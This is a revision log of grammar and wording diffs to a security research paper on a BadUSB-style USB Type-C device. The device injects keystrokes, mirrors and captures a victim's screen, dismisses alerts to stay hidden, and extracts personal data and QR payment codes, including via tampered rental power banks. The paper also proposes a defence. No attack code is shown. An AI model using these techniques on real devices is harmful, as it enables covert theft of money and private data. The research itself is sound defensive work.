+First, as \tool has established a feedback channel using \ac{USB} 3.x protocol, when performing keystroke and mouse movements injection, an attacker can obtain real-time feedback from the victim's device.
 This feedback allows an attacker to tell whether the previous attack succeeded and decide what to perform next.
@@
 Also, with mouse
-supported, \tool extends the original BadUSB attack and results in further attacks in
-mobile devices.
+supported, \tool extends the original BadUSB attack and results in further attacks.
 
@@
 meanwhile, \tool also receives keystrokes and mouse movements from the attacker
-through GSM/WiFi and replays them to the victim by the \ac{USB} emulation.
+through GSM/WiFi and replays them to the victim's device by the \ac{USB} emulation.
 

### 2021-03-22 WOOT/Files/conclusion.tex
grammar

--- 2021-03-20 WOOT/Files/conclusion.tex
@@
 propose a new defense scheme named \textit{isolated UI rendering}, which can
-effectively stop our \tool.
-
+effectively stop attacks with \tool.
 As for future work, we will further explore the potential of \textit{isolated UI

### 2021-03-22 WOOT/Files/countermeasure.tex
grammar

@@
 To defend against \tool and other USB-based attacks, we can simply reject all
-{unauthorized} device -- applying the \textit{distrust-by-default} policy. For example, 
+{unauthorized} devices -- applying the \textit{distrust-by-default} policy. For example, 
 in GoodUSB~\cite{tian2015defending}, all \ac{USB} devices are enabled with corresponding 
@@
 Figure~\ref{fig:isolated_ui}, we designed two separated \ac{UI} render layers and corresponding drivers, one
-is secure the other is insecure. When an application requires to render, it can
+is secure the another is insecure. When an application requires to render, it can
 pass the content along with a tag identifying whether the content is
 ``sensitive'' or not. If the content is tagged with ``sensitive'', then the OS
-will only render it on the secure layer, which only shows the sensitive content
+could only render it on the secure layer, which only shows the sensitive content
 (e.g., a keyboard) on the trusted screen. For the rest of the rendering, it

### 2021-03-22 WOOT/Files/discussion.tex
Unsubstantiated sentence
grammar

@@
 Though we proposed the attack initialization in Section~\ref{subsec:attack_init} to inject keystrokes to ensure \tool is mirroring primary screen.
-But without knowing the exact operating system of the victim's device, \tool may have to try multiple injections before successfully mirroring.
+But without knowing the exact operating system of the victim's device, \tool may have to try multiple injections before successfully mirroring the screen.
 Moreover, as mentioned in Section~\ref{sec:experiment}, \tool cannot directly obtain the information on the lock screen.
@@
 technologies develop rapidly, more and more devices will be equipped with USB-C
-capabilities, which makes \tool more influential.  
-Since non-professional users often neglect checking the security of plug-in \ac{USB} devices, they are often unaware of the attacks from \tool.
+capabilities~\cite{li2018usb}, which makes \tool more influential.  
+Since non-professional users may neglect checking the security of plug-in \ac{USB} devices, 
+they may unaware of the attacks from \tool.
 can be hardly detected by them while attacks are performing.  

### 2021-03-22 WOOT/Files/experiment.tex
grammar

--- 2021-03-22 WOOT/Files/experiment.tex
@@
 In both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject ``Win+P'' (The ``Win'' key is the ``Super'' key in Windows and Ubuntu by default) to switch between different modes for external display.
-Figure~\ref{fig:ubuntu_switch} illustrates how these keystrokes works on Ubuntu and Windows 10 is similar.
+Figure~\ref{fig:ubuntu_switch} illustrates how these keystrokes works on Ubuntu and it is similar in Windows 10.
 In MacOS, according to the official manual~\cite{appleman}, \tool can inject \mbox{``Command+F1''} keystrokes to set the victim's device to mirror the primary screen.
@@
 2020}, a PC with Windows 10 \mbox{(OS Build 18363.1379)} and Ubuntu 20.04.2 LTS with two \ac{USB} Type-C interfaces as the
-target device.
+target devices.
 During this experiment, \tool disguised itself as a normal keyboard and an external screen as feedback channel.
@@
 Thus we had successfully completed the attack initialization.
-Then we tested three scripts, ranging from reverse shell backdoor to malware payload execution, all of which resulted in success.
+Then we tested three scripts, ranging from reverse shell backdoor to malware payload execution, all of them resulted in success.
 Compared to original BadUSB attacks like Rubber Ducky, our \tool can provide attackers real-time feedback which allows attackers to perform more accurate attacks.
@@
 	generation), a tablet running iOS 14.4 (Build 18D52) with a \ac{USB} Type-C interface, as the target
-device in this experiment.  Besides disguising as normal \acp{HID} like a
+device in this experiment.  Besides disguising themself as normal \acp{HID} like a
 conventional BadUSB~\cite{badusb}, \tool also transmitted real-time video
@@
 First, under \ac{HID} emulator mode, the attacker is able to implant malware and backdoor scripts into victims' devices.
-Moreover, using video capture mode, once the victims access their sensitive data such as QR payment  code or photos, their sensitive data will be immediately transmitted via \tool to the attacker.
-Lastly, with full control mode, the attacker has complete control over the victims' device and can conduct any action on the victim device.
+Moreover, using video capture mode, once the victims access their sensitive data such as QR payment  code or photos, their sensitive data could be immediately transmitted via \tool to the attacker.
+Lastly, with full control mode, the attacker has complete control over the victims' devices and could conduct any actions on the victims' devices.
 

### 2021-03-22 WOOT/Files/introduction.tex
grammar

@@
 The \ac{USB} protocol has become popular worldwide
-since its appearance in 1996, as it provides a unified and easy-to-use approach for a
+since its appearance in 1996, as it provides a unified and easy-to-use approach for an
 extensive range of devices to communicate with each other.  From version 1.0 till
@@
 designed a method, called isolated \ac{UI} rendering, to separate the user interface
-into sensitive and insensitive layers.  Only the insensitive layer's content will be passed to the insecure driver and thus rendered on the external display, protecting the sensitive layer's content.
+into sensitive and insensitive layers.  Only the insensitive layer's content would be passed to the insecure driver and thus rendered on the external display, protecting the sensitive layer's content.
 %\shuqing{Case study, evaluation, notable results.}

### 2021-03-22 WOOT/Files/experiment.tex

@@
 for micropayment purchases. For example, WeChat
-Pay~\cite{Wechat-pay} regards transactions under USD \textdollar 154 as
+Pay~\cite{Wechat-pay} regards transactions under US\textdollar 154 as
 micropayments.  Different from a typical payment procedure, when micropayments

### 2021-03-22 WOOT/Files/conclusion.tex
conclusion

--- 2021-03-22 WOOT/Files/conclusion.tex
@@
 \section{Acknowledgement}
-We are very grateful to our shepherd, Michael Schwarz and the anonymous reviewers for their valuable comments that improved the paper.
+We are very grateful to our shepherd, Michael Schwarz, and the anonymous reviewers for their valuable feedback that improved the paper.

### 2021-03-22 WOOT/Files/related_work.tex
revise on related work.

@@
 abuses this standard and monitoring the victim's device utilizing \ac{USB} 2.0 protocol. Although \ac{JFA}~\cite{JFC} could exfiltrates video data from the victim's device without permission,  
-there are two main limitation compared with \tool: 
-\ding{182} \ac{JFA}~\cite{JFC} can only exfiltrate video data passively from the victim's device, while \tool can control the victim's device at the same time as monitoring the screen.
-All data can be collected by \ac{JFA} only after the victim's interaction, while \tool can gather sensitive data actively through \ac{HID} injection.
-For example, if a victim leaves his/her phone charging without locking it, \ac{JFA} cannot obtain anything in this case, while \tool can actively control his/her device and gather sensitive information.
-\ding{183} The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest mobile devices supporting \ac{MHL} were released in 2015, which indicates the lack of support of \ac{MHL} and limits the attack range of \ac{JFA}.
+there are two main limitations compared with \tool: 
+(1) \ac{JFA}~\cite{JFC} can only exfiltrate video data passively from the victim's device, while \tool can control the victim's device at the same time as monitoring the screen.
+All data can be collected by \ac{JFA} only after the victim's interaction, while \tool can gather sensitive data actively through \ac{HID} injections.
+For example, if a victim leaves his/her phone charging without locking it, \ac{JFA} cannot conduct attacks in this case, while \tool can actively control his/her device and gather sensitive information.
+(2) The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest mobile devices supporting \ac{MHL} were released in 2015, which indicates the lack of support of \ac{MHL} and limits the attack range of \ac{JFA}.
 \tool attacks over \ac{USB} Type-C interface, the latest \ac{USB} connector designed to replace all previous USB connector including MicroUSB~\cite{li2018usb}.

### 2021-03-22 WOOT/Files/experiment.tex
minor experiment edits
edits. `

@@
 without the password. During our experiment, we noticed that this HUAWEI device supports `Desktop Mode'
-for its external screen, which enables user to use their devices like a desktop computer with a external screen.
+for its external screen, which enables user to use their devices like a desktop computer with an external screen.
 If \tool is set into this mode, \tool is able to inject mouse movements to set itself into mirroring the primary screen, as we discussed in Section~\ref{subsec:attack_init}.
@@
 For example, \tool can be attached to the power station, which provides USB 3.x hubs, in the airport to perform attacks.
-Most people charge their laptops or smartphones in the power station in emergency, with negligence of security.
+Most people charge laptops or smartphones in the power station in emergency, with negligence of security.
 In the following paragraphs, we will demonstrate the attack scenarios of \tool using sharing power bank as an example.
@@
 There also exists information such as payment password that is not available immediately, but such a piece of information can be obtained once the victim inputs it.
-The obtained information can be further used to guess the victim's lock screen password and poses even greater threat to victim's privacy.
+The obtained information can be used to guess the victim's lock screen password and poses further threat to victim's privacy.
 

### 2021-03-22 WOOT/Files/introduction.tex
minor

@@
 modes of \ac{USB} attacks based on our approach to verify its effectiveness,
-including \ac{HID} Emulator Mode, Video Capture Mode, and Fully Control Mode.  To improve the
+including \ac{HID} Emulator Mode, Video Capture Mode, and Full Control Mode.  To improve the
 efficiency and performance of \tool, we designed a filtering algorithm to

### 2021-03-22 WOOT/Files/related_work.tex
minor

@@
 (2) The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest mobile devices supporting \ac{MHL} were released in 2015, which indicates the lack of support of \ac{MHL} and limits the attack range of \ac{JFA}.
-\tool attacks over \ac{USB} Type-C interface, the latest \ac{USB} connector designed to replace all previous USB connector including MicroUSB~\cite{li2018usb}.
+\tool attacks over \ac{USB} Type-C interface, the latest \ac{USB} connector designed to replace all previous USB connectors including MicroUSB~\cite{li2018usb}.
 So \tool has a wider attack range.

### 2021-03-22 WOOT/Files/experiment.tex
minor

@@
 \circled[text=white,fill=myblue]{\scriptsize{A}} is a HUAWEI mobile phone, the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\scriptsize{1}} is the \ac{USB} 3.x Hub; \circled[text=white,fill=myblue]{\scriptsize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\scriptsize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\scriptsize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\scriptsize{5}} is an Atmel ATMEGA32U4 board as the \ac{HID} Emulator.
+
 %\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,
@@
 
-\subsection{Fully Control Mode}
+\subsection{Full Control Mode}
 %\fengwei{In BadUSB-C section, remote control model is after privacy extraction mode.}
@@
 											%\cline{2-4}
-							       			& WhatsApp (2.21.5.18)    & Account, Contacts, Chat History, Phone Number    & \\
+							       			& WhatsApp (2.21.5.18)    & Account, Contacts, Chat History, Phone Number    & <None> \\
 											\cline{2-4}
-							       			& Facebook (309.0.0.47.119)   & Account, Posts, Contacts           & \\
+							       			& Facebook (309.0.0.47.119)   & Account, Posts, Contacts           & <None> \\
 		\hline
@@
 		\hline
-		\multirow{1}{*}{Shopping App}		& Amazon Shopping (22.6.0.100)  & Account, Orders, Shopping Cart         				& \\
+		\multirow{1}{*}{Shopping App}		& Amazon Shopping (22.6.0.100)  & Account, Orders, Shopping Cart         				& <None> \\
 											%\cline{2-4}
-		                					%& Taobao      & Personal physical metrics      						& \\
+		                					%& Taobao      & Personal physical metrics      						& <None> \\
 		\hline
-		\multirow{2}{*}{Tool}               & Chrome (89.0.4389.72)      & Browsing History                                	& \\
+		\multirow{2}{*}{Tool}               & Chrome (89.0.4389.72)      & Browsing History                                	& <None> \\
 											\cline{2-4}
-		                					& Health (11.0.5.508)      & Personal Health Metrics      						& \\
+		                					& Health (11.0.5.508)      & Personal Health Metrics      						& <None> \\
 		\hline
-		\multirow{3}{*}{System}             &  Messages (11.0.1.430)   & Contacts, Chat History				 &   \\
+		\multirow{3}{*}{System}             &  Messages (11.0.1.430)   & Contacts, Chat History				 &  <None> \\
 											\cline{2-4}
@@
 											\cline{2-4}
-		                					& Settings (11.0.0.300) - VPN    & VPN Address, VPN Account, VPN Password      						& \\
+		                					& Settings (11.0.0.300) - VPN    & VPN Address, VPN Account, VPN Password      						& <None> \\
 		\hline

### 2021-03-22 WOOT/Files/discussion.tex
edits. `
full control mode

@@
  Apart from that, we also noticed that in most devices, when an external monitor is connected to the device, there will be notifications about the monitor.
-In iPad, there is a small blue icon on the notification bar.
+In iPad, there is a small blue icon in the notification bar.
 In Windows 10, there is a pop-up for user to select the functionality of the external monitor.
@@
 When selecting devices to test \tool, we find that many smartphones equipped with USB-C connectors actually do not support \ac{USB} 3.x protocol.
-There is a incomplete list of devices that support DisplayPort over \ac{USB}~\cite{usbclist}.
+There is an incomplete list of devices that support DisplayPort over \ac{USB}~\cite{usbclist}.
 Most vendors like HUAWEI and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones.

### 2021-03-22 WOOT/Files/introduction.tex
full control mode

@@
 modes of \ac{USB} attacks based on our approach to verify its effectiveness,
-including \ac{HID} Emulator Mode, Video Capture Mode, and Full Control Mode.  To improve the
+including \ac{HID} Emulator Mode, Video Capture Mode, and full control mode  To improve the
 efficiency and performance of \tool, we designed a filtering algorithm to

### 2021-03-22 WOOT/Files/introduction.tex
unify captalization

@@
 modes of \ac{USB} attacks based on our approach to verify its effectiveness,
-including \ac{HID} Emulator Mode, Video Capture Mode, and full control mode  To improve the
+including \ac{HID} emulator mode, video capture Mode, and full control mode  To improve the
 efficiency and performance of \tool, we designed a filtering algorithm to

### 2021-03-22 WOOT/Files/introduction.tex
unify captalization

@@
 modes of \ac{USB} attacks based on our approach to verify its effectiveness,
-including \ac{HID} emulator mode, video capture Mode, and full control mode  To improve the
+including \ac{HID} emulator mode, video capture mode, and full control mode  To improve the
 efficiency and performance of \tool, we designed a filtering algorithm to

### 2021-03-22 WOOT/Files/discussion.tex
minor

@@
 But they are still noticeable by the victim.
-Also, it cannot be ignored that DisplayPort over \ac{USB} is not available on all devices.
+Also, it cannot be ignored that DisplayPort over USB Type-C is not available on all devices.
 When selecting devices to test \tool, we find that many smartphones equipped with USB-C connectors actually do not support \ac{USB} 3.x protocol.
@@
 Most vendors like HUAWEI and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones.
-But there also exists vendor like Xiaomi who does not support \ac{USB} 3.x protocol at all.
+But there also exists vendors like Xiaomi who does not support \ac{USB} 3.x protocol at all.
 

### 2021-03-22 WOOT/Files/introduction.tex
fix saying of Xiaomi

@@
 extends BadUSB to support the features of \ac{USB} Type-C.
-Although many smartphones equipped with USB-C connectors do not support \ac{USB} 3.x protocol, such as some non-flagship products of Xiaomi, more and more vendors like HUAWEI and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones~\cite{usbclist}.
+Although many smartphones equipped with USB-C connectors do not support \ac{USB} 3.x protocol, such as products of Xiaomi, more and more vendors like HUAWEI and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones~\cite{usbclist}.
 Since \mbox{\ac{USB} Type-C} can transfer video stream data, \tool could obtain the information of the

### 2021-03-22 WOOT/Files/experiment.tex
fuck caps
fuck

@@
 		Device                                                               & Operating System                                                                                         & Notification              & Dismiss Action                                            \\ \hline
-		\begin{tabular}[c]{@{}c@{}}Lenovo Xiaoxin Pro 13\\ 2020\end{tabular} & Windows 10 (OS Build 18363.1379)                                                                         & Pop-up                    & ``Win+P''-\textgreater{}Mouse click on `Duplicate' Option \\ \hline
+		\begin{tabular}[c]{@{}c@{}}Lenovo Xiaoxin Pro 13\\ 2020\end{tabular} & Windows 10 (OS Build 18363.1379)                                                                         & Pop-up                    & ``Win+P''-\textgreater{}Mouse click on ``Duplicate'' Option \\ \hline
 		\multirow{2}{*}{HUAWEI P30 (ELE-AL00)}                               & \multirow{2}{*}{\begin{tabular}[c]{@{}c@{}}EMUI 11.0.0.135(C00E128R2P5)\\ Android 10 based\end{tabular}} & Status bar indicator      & N/A                                                       \\ \cline{3-4}
@@
 target devices.
-During this experiment, \tool disguised itself as a normal keyboard and an external screen as feedback channel.
+During this experiment, \tool disguised itself as a normal keyboard and an external screen as a feedback channel.
 When first plugged in, the victim's device raised a pop-up window asking the victim which mode should the new screen be set to.
@@
 Then we tested three scripts, ranging from reverse shell backdoor to malware payload execution, all of them resulted in success.
-Compared to original BadUSB attacks like Rubber Ducky, our \tool can provide attackers real-time feedback which allows attackers to perform more accurate attacks.
+Compared with original BadUSB attacks like Rubber Ducky, our \tool can provide attackers real-time feedback, which allows attackers to conduct more accurate attacks.
 %This also warned us that we need more thorough defense against such BadUSB
@@
 an attacker to identify payment code in the video stream and performs transactions
-without the password. During our experiment, we noticed that this HUAWEI device supports `Desktop Mode'
-for its external screen, which enables user to use their devices like a desktop computer with an external screen.
+without the password. During our experiment, we noticed that this HUAWEI device supports ``Desktop Mode''
+for its external screen, which enable users to use their devices as if they were using a computer with an external monitor.
 If \tool is set into this mode, \tool is able to inject mouse movements to set itself into mirroring the primary screen, as we discussed in Section~\ref{subsec:attack_init}.

### 2021-03-22 WOOT/Files/introduction.tex
something

@@
 them from taking subsequent moves.  For example, it is hard for attackers to
-locate specific functional \ac{UI} patterns such as buttons and links on victim
+locate specific functional \ac{UI} patterns such as buttons and links on victim's
 computers by disguising \ac{USB} devices, e.g., mice.  This explains why typical
@@
 and the overall implementation of \tool in three different modes.  The
-experiments and user study we conducted are featured in
-Section~\ref{sec:experiment}.  We present the possible countermeasures of \tool
+experiments we conducted are featured in
+Section~\ref{sec:experiment}.  We present some possible countermeasures of \tool
 in Section~\ref{sec:countermeasures}.  The limits and impacts of our approach

### 2021-03-22 WOOT/Files/related_work.tex
something

--- 2021-03-22 WOOT/Files/related_work.tex
@@
 Though this poses a great challenge to the availability of a system, this
-attack still requires physical access to the host and is unable to cause more
+attack still requires physical access to the victim's device and is unable to cause more
 damage other than \ac{DoS}.
@@
 it to act like other devices. When these modified drives are connected to the
-host, they could be recognized as a keyboard or mouse. Then the attacker can
+victim's device, they could be recognized as a keyboard or mouse. Then attackers can
 execute malicious payloads as they are using the victim's device. Due to the
 limitation of \ac{USB} 2.0~\cite{usb20} protocol, these BadUSB
-attacks~\cite{badusb} are unable to obtain video feedback from the victim
+attacks~\cite{badusb} are unable to obtain video feedback from the victim's device
 as video stream was not supported until \ac{USB} 3.0~\cite{usb30}.
@@
 \ac{JFA}~\cite{JFC},
-abuses this standard and monitoring the victim's device utilizing \ac{USB} 2.0 protocol. Although \ac{JFA}~\cite{JFC} could exfiltrates video data from the victim's device without permission,  
+abuses this standard and monitors the victim's device utilizing \ac{USB} 2.0 protocol. Although \ac{JFA}~\cite{JFC} could exfiltrates video data from the victim's device without permission,  
 there are two main limitations compared with \tool: 
 (1) \ac{JFA}~\cite{JFC} can only exfiltrate video data passively from the victim's device, while \tool can control the victim's device at the same time as monitoring the screen.
-All data can be collected by \ac{JFA} only after the victim's interaction, while \tool can gather sensitive data actively through \ac{HID} injections.
+The data can only be collected by \ac{JFA} after the victim's interaction, while \tool can gather sensitive data actively through \ac{HID} injections.
 For example, if a victim leaves his/her phone charging without locking it, \ac{JFA} cannot conduct attacks in this case, while \tool can actively control his/her device and gather sensitive information.
 (2) The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest mobile devices supporting \ac{MHL} were released in 2015, which indicates the lack of support of \ac{MHL} and limits the attack range of \ac{JFA}.
-\tool attacks over \ac{USB} Type-C interface, the latest \ac{USB} connector designed to replace all previous USB connector including MicroUSB~\cite{li2018usb}.
+\tool attacks the victim's device over \ac{USB} Type-C interface, the latest \ac{USB} connector designed to replace all previous USB connectors including MicroUSB~\cite{li2018usb}.
 So \tool has a wider attack range.

### 2021-03-22 WOOT/Files/conclusion.tex
full control mode
啊
commit fuck emulation fuck themselves

@@
 new attack scheme named \tool and three attack modes. Each of these three modes
-has its own strength and use scenarios. The \ac{HID} Emulation mode largely extends the
+has its own strength and use scenarios. The \ac{HID} emulation mode largely extends the
 original BadUSB. The video capture mode proved practical and powerful, as it extracts
-victim's sensitive information in a stealthy way. The fully control mode
+victim's sensitive information in a stealthy way. The full control mode
 achieves the complete hijack of the target device, allowing us to perform various

### 2021-03-22 WOOT/Files/experiment.tex

@@
 
-\subsection{HID Emulator Mode}
+\subsection{HID Emulation Mode}
 
-In the experiment of HID emulator mode, we used {Lenovo Xiaoxin Pro 13
+In the experiment of HID emulation mode, we used {Lenovo Xiaoxin Pro 13
 2020}, a PC with Windows 10 \mbox{(OS Build 18363.1379)} and Ubuntu 20.04.2 LTS with two \ac{USB} Type-C interfaces as the
@@
 	generation), a tablet running iOS 14.4 (Build 18D52) with a \ac{USB} Type-C interface, as the target
-device in this experiment.  Besides disguising themself as normal \acp{HID} like a
+device in this experiment.  Besides disguising themselves as normal \acp{HID} like a
 conventional BadUSB~\cite{badusb}, \tool also transmitted real-time video
@@
 %\hongyi{Better way to express this?}
-First, under \ac{HID} emulator mode, the attacker is able to implant malware and backdoor scripts into victims' devices.
+First, under \ac{HID} emulation mode, the attacker is able to implant malware and backdoor scripts into victims' devices.
 Moreover, using video capture mode, once the victims access their sensitive data such as QR payment  code or photos, their sensitive data could be immediately transmitted via \tool to the attacker.

### 2021-03-22 WOOT/Files/experiment.tex
god save me

--- 2021-03-22 WOOT/Files/experiment.tex
@@
 As mentioned in Section~\ref{sec:badusb},
-our \tool only requires common components that are easily accessible online or
+our \tool only requires common components that are easy to access online or
 in any electronic store. Here we chose the following parts to build a
@@
 \begin{itemize}
-	\item \textbf{Screen Mirror}:
-		During our experiment, we noticed that some devices did not mirror their screens to our \tool by default.
-In this case, \tool would inject a sequence of keystrokes to set the victim's device to mirror the primary screen.
-In both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject ``Win+P'' (The ``Win'' key is the ``Super'' key in Windows and Ubuntu by default) to switch between different modes for external display.
-Figure~\ref{fig:ubuntu_switch} illustrates how these keystrokes works on Ubuntu and it is similar in Windows 10.
-In MacOS, according to the official manual~\cite{appleman}, \tool can inject \mbox{``Command+F1''} keystrokes to set the victim's device to mirror the primary screen.
-In EMUI, there is a special mode called ``Desktop Mode'', which allows users to use their smartphones like a desktop computer with an external screen.
-If this mode is enabled, as victim's ``desktop'' can be obtained, \tool can inject mouse movements to switch to mirror mode.
+	\item \textbf{Screen Mirroring}:
+		During our experiment, we noticed that some devices did not mirror their main displays to our \tool by default.
+In this case, \tool would inject a series of keystrokes to mirror the victim's primary display.
+On both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject ``Win+P'' (the ``Win'' key is the ``Super'' key on Windows and Ubuntu by default) to switch the display modes for the external display.
+Figure~\ref{fig:ubuntu_switch} illustrates how these keystrokes work on Ubuntu, similar to that on Windows 10.
+On MacOS, according to the official manual~\cite{appleman}, \tool can inject \mbox{``Command+F1''} keystrokes to mirror the victim's primary display.
+In EMUI, there is a special mode called ``Desktop Mode'' that allows users to use their smartphones as desktop computers with external displays.
+If this mode is enabled, since the victim's ``desktop'' can be obtained, \tool can inject mouse movements to switch to mirror mode.
 		\begin{figure}[H]
 			\includegraphics[width=\linewidth]{./Figs/ubuntu_switch.png}\\
-			\caption{Switching Screen Mode in Ubuntu.}
+			\caption{Switching Display Mode on Ubuntu.}
 			\label{fig:ubuntu_switch}
@@
 	\item \textbf{Dismiss Notification}:
-		In our experiment, we found that some devices would notify the user the presence of an external screen. During our experiment, the following notifications were raised:
+		In our experiment, we found that some devices would notify the user of the presence of an external display. During our experiment, the following notifications were raised:
 		\begin{itemize}
-		 \item On Lenovo Xiaoxin Pro 13, it raised a pop-up asking user to select the functionality of the external screen.
-		 \item On HUAWEI P30, it showed a status bar indicator and a persistent notification about the external monitor.
-		 \item On iPad Pro (the third generation), it also showed a blue status bar indicator and a notification about \ac{USB} accessories if iPad is locked.
+		 \item On Lenovo Xiaoxin Pro 13, it raised a pop-up asking user to choose the functionality of the external display.
+		 \item On HUAWEI P30, it showed a status bar indicator and a persistent notification about the external display.
+		 \item On iPad Pro (the third generation), if iPad is locked, it also showed a blue status bar indicator and a notification about \ac{USB} accessories.
 		\end{itemize}
-		To avoid being discovered by the victim, \tool can inject keystrokes and mouse movements to dismiss some of these notifications.
-For example, in the first case, \tool is able to inject a sequence of mouse movements to set the screen at mirror mode to dismiss the pop-up.
+		To avoid being discovered by the victim, \tool can inject keystrokes and mouse movements to eliminate some of these notifications.
+		For example, in the first case, \tool is able to inject a series of mouse movements to set the display to mirror mode, thereby eliminating the pop-up.
 \end{itemize}
@@
 target devices.
-During this experiment, \tool disguised itself as a normal keyboard and an external screen as a feedback channel.
+During this experiment, \tool disguised itself as a normal keyboard and an external display as a feedback channel.
 When first plugged in, the victim's device raised a pop-up window asking the victim which mode should the new screen be set to.
-\tool immediately injected a sequence of mouse movements and clicks to set itself as a mirror to the primary monitor.
+\tool immediately injected a series of mouse movements and clicks to set itself as a mirror to the primary display.
 Thus we had successfully completed the attack initialization.
@@
 During the experiment of privacy extraction via our video capture mode, we chose \mbox{\textit{HUAWEI P30 (ELE-AL00)}}, a
-smartphone in \mbox{EMUI 11.0.0.135(C00E128R2P5)} \mbox{(Android 10.0 based)} with a \ac{USB} Type-C interface, as the
-target device. In the privacy extraction experiment, \tool passively captured video
-from the victim's device and used \textit{OpenCV} to identify the sensitive
-information from the video stream.  When the victim viewed text or photos with
-text, \tool used the techniques of \ac{OCR}  to
-extract text from corresponding video frames. In this experiment, the attacker
-successfully extracted text such as name, address, ID number, and other sensitive
-personal information. We also tested the payment code extractor, which enables
-an attacker to identify payment code in the video stream and performs transactions
-without the password. During our experiment, we noticed that this HUAWEI device supports ``Desktop Mode''
-for its external screen, which enable users to use their devices as if they were using a computer with an external monitor.
-If \tool is set into this mode, \tool is able to inject mouse movements to set itself into mirroring the primary screen, as we discussed in Section~\ref{subsec:attack_init}.
+smartphone in \mbox{EMUI 11.0.0.135(C00E128R2P5)} \mbox{(Android 10.0 based)} with a \ac{USB} Type-C interface, as the target device.
+In the privacy extraction experiment, \tool passively captured video from the victim's device and used \textit{OpenCV} to identify the sensitive information from the video stream.
+When the victim viewed text or photos with text, \tool used the techniques of \ac{OCR} to extract text from corresponding video frames.
+In this experiment, the attacker successfully extracted text such as name, address, ID number, and other sensitive personal information.
+We also tested the payment code extractor, which enables an attacker to identify payment code in the video stream and performs transactions
+without the password.
+During our experiment, we noticed that this HUAWEI device supports ``Desktop Mode'' for its external display, which enable users to use their devices as if they were using a computer with an external display.
+If \tool is set into this mode, \tool is able to inject mouse movements to set itself into mirroring the primary display, as we discussed in Section~\ref{subsec:attack_init}.
 As this is also a part of our case study, more details about
@@
 
-To test the capability of the full control mode, we chose iPad Pro (3rd
-	generation), a tablet running iOS 14.4 (Build 18D52) with a \ac{USB} Type-C interface, as the target
-device in this experiment.  Besides disguising themself as normal \acp{HID} like a
-conventional BadUSB~\cite{badusb}, \tool also transmitted real-time video
-stream from the target device to the attacker via WiFi.  After establishing the connection, the attacker performed a series of actions to test the capability of
-\tool. In the beginning, the attacker accessed the album application on the iPad and
-obtained all the photos inside. After that, the attacker sent messages via the victim's
-account. At last, the attacker performed a transaction using the
-financial application. All of these tests resulted in success.
+To test the capability of the full control mode, we chose iPad Pro (3rd generation),
+a tablet running iOS 14.4 (Build 18D52) with a \ac{USB} Type-C interface,
+as the target device in this experiment.
+In　addition to disguising themselves as normal \acp{HID} like a conventional BadUSB~\cite{badusb}, \tool also transmitted the real-time video stream from the target device to the attacker via WiFi.
+After establishing the connection, the attacker performed a series of actions to test the capability of \tool.
+In the beginning, the attacker accessed the album application on the iPad and obtained all the photos inside.
+After that, the attacker sent messages via the victim's account. At last, the attacker performed a transaction using a financial application.
+All of these tests resulted in success.
 
@@
 
-Power bank sharing is a popular service in Asia, power bank stations are deployed
-in markets, stores, and even newsstands. For example, Figure~\ref{fig:PBS_products} are photos
-of two power bank stations in China, which are taken outside of a supermarket. Brick~\cite{Brick} is also such a power bank sharing service provider from
-Sweden. It provides power bank rental service all over Sweden and is planning on expanding its
-service to entire Europe.
+Power bank sharing is a popular service in Asia, power bank stations are deployed in markets, stores, and even newsstands.
+For example, Figure~\ref{fig:PBS_products} are photos of two power bank stations in China, which are taken outside of a supermarket.
+Brick~\cite{Brick} is also such a power bank sharing service provider from Sweden.
+It provides power bank rental service all over Sweden and is planning on expanding its service to entire Europe.
 \begin{figure}[t]
@@
 
-Sharing power banks not only provides convenience to users, but also brings security issues.  We noticed that most of the power bank stations do not
-check the integrity of power banks during the rental process, and users are
-hardly cautious to check the power banks when connecting their devices.  An
-attacker is able to tamper rented power banks and return them to a power bank
-station causing a potential threat to subsequent users.
+Sharing power banks bring convenience but also security issues.
+We noticed that most of the power bank stations do not check the integrity of the power bank during the rental process, and users rarely check the power banks carefully when connecting the power bank to their devices.
+An attacker can tamper with a rented power bank and return it to a power bank station, thereby posing a potential threat to subsequent users.
 
 \textbf{QR Code Payment}.
-QR code payment is a new type of payment method that is popular in Asia.
-Its most well-known cases are WeChat Pay~\cite{Wechat-pay} and Alipay~\cite{AliPay}.
-QR code payment provides merchant and client a convenient way of offline payment while ensuring equivalent security as the credit card.
-As illustrated in Figure~\ref{fig:qr_payment_procedure},
- QR code payments are typically performed in the following steps:
-\ding{182} The client presents the payment QR code on the mobile device to the merchant.
-The QR code is encoded with a globally unique ID to identify the client's account.
-\ding{183} The merchant scans the payment QR code and charges the corresponding amount of money.
-By presenting this QR code, the client authorizes the proceeding transaction.
-\ding{184} After confirmation, the payment service provider proceeds with this transaction and returns the payment result to both the merchant and the client.
-\shuqing{I think this paragraph can be shorter. No need to explain so many details.}
-\hongyi{Dont know how to be more concise.}
+QR code payment is a new payment method popular in Asia.
+The most famous cases are WeChat Pay~\cite{Wechat-pay} and Alipay~\cite{AliPay}.
+QR code payment provides merchants and customers with a convenient offline payment method while ensuring equivalent security as credit cards.
+As illustrated in Figure~\ref{fig:qr_payment_procedure}, QR code payments are typically performed in the following steps:
+(1) The customer shows the QR payment code to the merchant on the mobile device.
+The QR code is encoded with a globally unique ID to identify the customer's account.
+(2) The merchant scans the QR payment code and charges the corresponding amount.
+By showing this QR code, the customer authorizes the proceeding transaction.
+(3) After confirmation, the payment service provider proceeds with this transaction and returns the payment result to both the merchant and the customer.
 
@@
 
-Next, we explain one type of payments called micropayment. A micropayment is pre-determined by the payment
-service provider with thresholds in the user agreement. In real-world scenarios, payment service providers use different rules
